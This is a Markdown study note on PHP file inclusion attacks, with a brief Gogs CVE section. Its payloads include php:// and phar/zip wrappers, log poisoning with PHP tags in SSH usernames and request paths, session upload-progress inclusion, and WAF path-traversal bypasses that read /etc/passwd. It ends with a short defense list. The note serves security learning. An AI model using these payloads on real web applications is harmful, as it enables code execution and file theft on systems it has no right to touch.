# File Inclusion  
When PHP includes a file, PHP will execute the included file as PHP script no matter what kind of the file type is.  

PHP:  
*  [Environment](#environment)  
*  [Methods to include](#methods-to-include)  
*  [WAF bypass](#waf-bypass)  

Gogs:  
*  [Inject path to session id](#inject-path-to-session-id)  
  
Conclusion:  
*  [Defense](#defense)  
*  [Reference](#reference)    

# Environment  
Here I would put some settings that you need to know before starting on Local File Inclusion. In `php.ini`:  
1. `allow_url_include` (default: off and makes it impossible to RFI)  
2. `session.auto_start` (default: off and makes it hard to create session)  
3. `session.upload_progress.cleanup` (default: On and makes it hard to include the session)  

# Methods to include  
File inclusion is always used to arbitrary code execution:  
1. pseudo protocol  
```php
php://input
// Condition：allow_url_include = on
?file=php://input
POST data: xxx

php://filter
// get base-64 encoded source code
?file=php://filter/read=convert.base64-encode/resource=file.php
// It's important that filter can be used to handle string with various ways, please take a look at the reference#1
php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php

phar://path.zip/file.php
// php5.3.0up, parse the archived file
// Sam Thomas publish a new use of phar able to unserialize without unserialize() function, please take a look at my Unserialization part

zip://path.zip%23file.php
// php5.3.0up, work as phar://, but need absolute path, and need to encode # as %23
```  
[List of Available Filters](http://php.net/manual/en/filters.php)

2. Session inclusion  
* [include tmp with phpinfo](https://github.com/vulhub/vulhub/tree/master/php/inclusion) -> `/tmp/sess_SESSIONID`  
* 🍊[Hitcon2018 ONE LINE PHP CHALLENGE](https://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html)[Session Upload Progress ](http://php.net/manual/en/session.upload-progress.php)  
If you provide the `PHP_SESSION_UPLOAD_PROGRESS` in **multipart** POST data, PHP will enable the session for you!  

3. Log inclusion  
If client has permission to read the log  
```php
ssh '<?php phpinfo();?>'@remotehost

GET /<?php phpinfo();?> HTTP/1.1
```  
include `/var/log/apache2/access.log` or `error.log`, `/var/log/httpd/access_log`, `/etc/httpd/logs/access_log`, `/usr/local/nginx/logs`    

4. Include temporary file with segmentation fault [php 7.1.x<20](https://github.com/php/php-src/blob/PHP-7.1.0/ext/standard/filters.c#L277)  
In the above version, `php://filter/string.strip_tags/resource=` will cause to segmentation fault and temporary files cannot be cleaned up. [My analysis of the detail](https://github.com/shinmao/Web-Security-Learning/blob/master/LFI/LFI-with-segmentation-fault.pdf)  
```php
// assume that I can control the parameter of file function
include($_POST['file']);
```  
[Here is the script of bruteforce which can help to get temp filename](https://github.com/shinmao/Web-Security-Learning/blob/master/LFI/gen_tmp.py)

# WAF bypass  
* Relative path bypass  
WAF usually detect **continuous** multiple `../`
```php
// according to parsing path

// not change
/./ not change
///./..//.//////./   -> use with conbination
```  
* Absolute path bypass, `/etc/passwd` would be blocked  
```php
/aaa/../etc/passwd
/etc/./passwd
```  

# Inject path to session id
[CVE-2018-18925](https://github.com/vulhub/vulhub/tree/master/gogs/CVE-2018-18925)  
The cause of this bug is that framework use file as the session provider, but not all framework do the same things. You can try to include the other file as fake session.  

# Defense  
Make a conclusion of the requirement above, we can get the following mitigation  
* php `open_basedir`  
* read permission  
* filter of dangerous characters  

# Reference  
1. [Phith0n 谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)  
2. [LFI with phpinfo assistance](https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf)  
3. [php文件包含漏洞](https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/?fbclid=IwAR0537cUHx0RuYwbjdVLudlitdkofr5HHhqMcafXW3aoWqlUoJ_lMRAsnk8)
